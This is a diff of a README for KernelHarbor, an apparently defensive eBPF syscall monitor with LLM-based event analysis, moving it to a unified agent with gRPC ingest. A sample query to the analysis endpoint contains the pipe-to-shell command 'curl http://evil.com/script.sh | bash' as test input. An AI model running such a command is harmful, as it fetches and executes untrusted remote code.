@@ -8,8 +8,8 @@ KernelHarbor captures system events (execve, open, network) using eBPF and analy
 
 <!-- ``` -->
 <!-- ┌──────────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────────┐ -->
-<!-- │  eBPF        │     │   HTTP API   │     │Elasticsearch │     │   Ollama    │ -->
-<!-- │  Tracers     │────▶│  (ingest)    │────▶│  (storage)   │────▶│ (AI Engine) │ -->
+<!-- │  eBPF        │     │   gRPC        │     │Elasticsearch │     │   Ollama    │ -->
+<!-- │  Tracers     │────▶│  (ingest)     │────▶│  (storage)   │────▶│ (AI Engine) │ -->
 <!-- └──────────────┘     └──────────────┘     └──────────────┘     └──────────────┘ -->
 <!-- ``` -->
 
@@ -19,16 +19,16 @@ KernelHarbor captures system events (execve, open, network) using eBPF and analy
 
 | Component | Description |
 |-----------|-------------|
-| `execve-tracer/` | eBPF-based process execution monitoring |
-| `open-tracer/` | eBPF-based file open monitoring |
-| `analysis/` | AI-powered event analysis pipeline |
+| `agent/` | Unified eBPF tracer (execve + open + connect) |
+| `analysis/` | AI-powered event analysis pipeline (gRPC + HTTP) |
 
 ### eBPF Programs (`bpf/`)
 
 | File | Description |
 |------|-------------|
 | `execve-tracer.bpf.c` | Hooks `sys_enter_execve` |
-| `open-tracer.bpf.c` | Hooks `sys_enter_openat` |
+| `open-tracer.bpf.c` | Hooks `sys_enter_open` |
+| `connect-tracer.bpf.c` | Hooks `sys_enter_connect` |
 
 ## Quick Start
 
@@ -53,22 +53,23 @@ ollama pull qwen2.5:7b
 ### Build
 
 ```bash
-# Build all components
-cd cmd/execve-tracer && go build -o execve-tracer .
-cd cmd/open-tracer && go build -o open-tracer .
+# Build consolidated agent (execve + open + connect)
+cd cmd/agent && go build -o agent .
+
+# Build analysis service
 cd cmd/analysis && go build -o analysis .
 ```
 
 ### Run
 
 ```bash
-# Terminal 1: Start analysis service
+# Terminal 1: Start analysis service (provides HTTP and gRPC)
 cd cmd/analysis && ./analysis
 
-# Terminal 2: Start tracer (requires sudo)
-sudo ANALYSIS_URL=http://localhost:8080/ingest ./execve-tracer
+# Terminal 2: Start unified agent (requires sudo)
+sudo GRPC_ADDRESS=localhost:9090 ./cmd/agent/agent
 
-# Terminal 3: Query analysis
+# Terminal 3: Query analysis via HTTP
 curl -X POST http://localhost:8080/analyze \
   -H "Content-Type: application/json" \
   -d '{"host.name":"myhost","query":"curl http://evil.com/script.sh | bash"}'
@@ -78,13 +79,22 @@ curl -X POST http://localhost:8080/analyze \
 
 ### Event Flow
 
-1. **eBPF Tracers** hook kernel syscalls (`execve`, `openat`)
+1. **eBPF Tracers** hook kernel syscalls (`execve`, `open`, `connect`)
 2. **Ring buffer** passes events to user-space Go program
-3. **HTTP POST** sends events to analysis API
+3. **gRPC** streams events to analysis service
 4. **Elasticsearch** stores events with vector embeddings
 5. **Async workers** batch events and analyze with Ollama
 6. **Vector search** finds semantically similar past events
 7. **LLM** generates security verdict
+
+### gRPC Service
+
+The analysis service exposes a gRPC API on port 9090 (configurable):
+
+| Method | Description |
+|--------|-------------|
+| `Ingest` | Stream events to the analysis pipeline |
+| `Analyze` | Query AI analysis for a specific event |
 
 ### Behavior Embedding
 
@@ -132,17 +142,19 @@ Response:
 
 | Variable | Default | Description |
 |----------|---------|-------------|
-| `ES_ADDRESSES` | `http://localhost:9200` | Elasticsearch |
+| `ES_ADDRESSES` | `http://localhost:9200` | Elasticsearch addresses |
 | `ES_INDEX` | `kb-events` | Events index |
 | `OLLAMA_ADDRESS` | `http://localhost:11434` | Ollama |
 | `OLLAMA_MODEL` | `qwen2.5:7b` | Analysis model |
 | `OLLAMA_EMBED_MODEL` | `nomic-embed-text` | Embedding model |
+| `PROTOCOL` | `both` | HTTP protocol: `http`, `grpc`, or `both` |
+| `GRPC_ADDRESS` | `:9090` | gRPC server address |
 
-### Tracers
+### Agent (Tracer)
 
 | Variable | Description |
 |----------|-------------|
-| `ANALYSIS_URL` | HTTP endpoint to send events |
+| `GRPC_ADDRESS` | gRPC server address to send events (e.g., `localhost:9090`) |
 
 ## Testing
 
@@ -166,11 +178,13 @@ curl -X POST http://localhost:8080/analyze \
 KernelHarbor/
 ├── bpf/                    # eBPF programs (C)
 │   ├── execve-tracer.bpf.c
-│   └── open-tracer.bpf.c
+│   ├── open-tracer.bpf.c
+│   └── connect-tracer.bpf.c
 ├── cmd/
-│   ├── execve-tracer/      # Process execution tracer
-│   ├── open-tracer/       # File access tracer
-│   └── analysis/          # AI analysis pipeline
+│   ├── agent/              # Unified tracer (execve + open + connect)
+│   └── analysis/          # AI analysis pipeline (gRPC + HTTP)
+├── proto/                  # Protocol Buffer definitions
+│   └── agent.proto
 ├── plan.md                 # Original design document
 └── README.md              # This file
 ```
